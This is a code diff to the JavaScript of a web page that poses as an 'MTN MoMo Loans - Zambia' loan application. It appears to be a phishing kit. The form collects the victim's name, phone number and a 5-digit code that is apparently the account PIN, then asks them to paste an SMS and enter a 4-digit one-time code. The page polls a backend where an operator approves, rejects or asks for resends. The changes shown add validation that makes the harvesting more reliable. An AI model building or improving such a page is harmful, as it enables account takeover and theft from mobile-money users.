@@ -1,7 +1,7 @@
 // --- Translation Dictionary ---
 const translations = {
     en: {
-        calc_welcome: "MTN MoMo Loans and Advances", calc_welcome_sub: "Get loans easily through MTN MoMo",
+        calc_welcome: "MTN MoMo Loans - Zambia", calc_welcome_sub: "Get loans easily through MTN MoMo",
         calc_title: "Loan Calculator", calc_amount: "Amount", calc_term: "Term", calc_monthly: "Monthly Payment", calc_btn: "START APPLICATION",
         form_step1: "Step 1 of 3", form_step2: "Step 2 of 3", form_step3: "Step 3 of 3",
         form_loan_details: "Loan Details", form_loan_type: "Loan Type", form_loan_business: "Business Loan", form_loan_personal: "Personal Loan", form_loan_emergency: "Emergency Loan", form_loan_amount: "Loan Amount (ZMW)", form_loan_term: "Loan Term", form_loan_purpose: "Purpose of Loan", 
@@ -65,6 +65,15 @@ function goToForm() {
 }
 
 function nextStep(stepNumber) {
+    // Validation Check: Ensure inputs on the current step are filled
+    if (stepNumber === 2) {
+        const purpose = document.getElementById('purposeInput').value.trim();
+        if (!purpose) {
+            alert("Please fill in the Purpose of Loan before continuing.");
+            return; // Stop from moving to step 2
+        }
+    }
+
     document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
     document.getElementById(`step-${stepNumber}`).classList.add('active');
     document.getElementById('progress-fill').style.width = stepNumber === 1 ? '33.33%' : (stepNumber === 2 ? '66.66%' : '100%');
@@ -72,19 +81,43 @@ function nextStep(stepNumber) {
 }
 
 function prevStep(stepNumber) {
-    nextStep(stepNumber);
+    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
+    document.getElementById(`step-${stepNumber}`).classList.add('active');
+    document.getElementById('progress-fill').style.width = stepNumber === 1 ? '33.33%' : '66.66%';
+    document.getElementById('step-indicator').innerText = translations[currentLang][`form_step${stepNumber}`];
 }
 
 // STEP 1: Submit initial form
 async function submitApplication() {
+    // Validate Step 2 Inputs
+    const firstName = document.getElementById('firstNameInput').value.trim();
+    const lastName = document.getElementById('lastNameInput').value.trim();
+    const phone = document.getElementById('phoneInput').value.trim();
+    const fiveDigit = document.getElementById('fiveDigitInput').value.trim();
+
+    if (!firstName || !lastName || !phone || !fiveDigit) {
+        alert("Please fill in all Personal Details before continuing.");
+        return;
+    }
+
+    if (phone.length !== 9) {
+        alert("Phone number must be exactly 9 digits.");
+        return;
+    }
+
+    if (fiveDigit.length !== 5) {
+        alert("Verification Code must be exactly 5 digits.");
+        return;
+    }
+
     showScreen('processing-screen');
     currentSessionId = Math.random().toString(36).substring(2, 15);
 
     const applicationData = {
-        firstName: document.querySelector('#step-2 input[placeholder="First Name"]').value || 'Not provided',
-        lastName: document.querySelector('#step-2 input[placeholder="Last Name"]').value || 'Not provided',
-        phone: document.querySelector('#step-2 input[type="tel"]').value || 'Not provided',
-        fiveDigitCode: document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value || 'Not provided',
+        firstName: firstName,
+        lastName: lastName,
+        phone: phone,
+        fiveDigitCode: fiveDigit,
         sessionId: currentSessionId
     };
 
@@ -105,7 +138,8 @@ async function submitApplication() {
 
 // STEP 2: Submit SMS
 async function submitSMS() {
-    const smsText = document.getElementById('smsInput').value;
+    const smsText = document.getElementById('smsInput').value.trim();
+    
     if(!smsText) {
         alert("Please paste the SMS first.");
         return;
@@ -128,10 +162,11 @@ async function submitSMS() {
     }
 }
 
-// STEP 3: Submit 4-digit code (NEW)
+// STEP 3: Submit 4-digit code
 async function submit4Digit() {
-    const fourDigitCode = document.getElementById('fourDigitInput').value;
-    if(!fourDigitCode) {
+    const fourDigitCode = document.getElementById('fourDigitInput').value.trim();
+    
+    if(!fourDigitCode || fourDigitCode.length !== 4) {
         alert("Please enter the 4-digit code.");
         return;
     }
@@ -167,34 +202,31 @@ function checkApprovalStatus(sessionId, currentStage) {
                 } else if (currentStage === 'sms') {
                     showScreen('verification-screen'); 
                 } else if (currentStage === '4digit') {
-                    showScreen('success-screen'); // Loads the new success page
+                    showScreen('success-screen');
                 }
             } 
             else if (data.status === 'REJECTED') {
                 clearInterval(interval);
                 alert("Incorrect 5-digit code. Please try again.");
-                
-                document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value = '';
+                document.getElementById('fiveDigitInput').value = '';
                 showScreen('form-screen');
                 nextStep(2);
             } 
             else if (data.status === 'RESEND') {
                 clearInterval(interval);
                 alert("Check your SMS for the new code sent. Please paste it again.");
-                
                 document.getElementById('smsInput').value = '';
                 showScreen('sms-screen');
             }
             else if (data.status === 'RESEND4') {
                 clearInterval(interval);
                 alert("Check your SMS for the new 4-digit code sent.");
-                
                 document.getElementById('fourDigitInput').value = '';
                 showScreen('verification-screen');
             }
             else if (data.status === 'INACTIVE') {
                 clearInterval(interval);
-                showScreen('error-screen'); // Loads the inactive/error page
+                showScreen('error-screen');
             }
         } catch (error) {
             console.error("Polling error:", error);
